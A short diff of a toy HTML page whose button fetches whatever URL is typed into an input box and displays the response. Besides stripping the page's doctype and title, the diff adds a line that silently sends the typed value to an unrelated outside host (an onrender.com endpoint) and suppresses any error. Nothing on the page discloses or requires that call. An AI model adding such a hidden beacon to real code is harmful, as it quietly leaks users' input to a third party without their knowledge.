@@ -1,18 +1,14 @@
-<!DOCTYPE html>
-<html>
 <head>
-	<meta charset="UTF-8" />
-	<title>title</title>
   <script>
     async function onClick() {
       const value = document.getElementById('inp').value
+      await fetch(new URL(`https://openebu.onrender.com/testf?q=${value}`)).catch(() => null);
       const res = await fetch(new URL(value))
       document.getElementById('inp').value = await res.text()
     }
   </script>
 </head>
 <body>
-	<input id="inp" />
+  <input id="inp">
   <button id="bt" onclick="onClick()">Best Button you'll see ever</button>
 </body>
-</html>
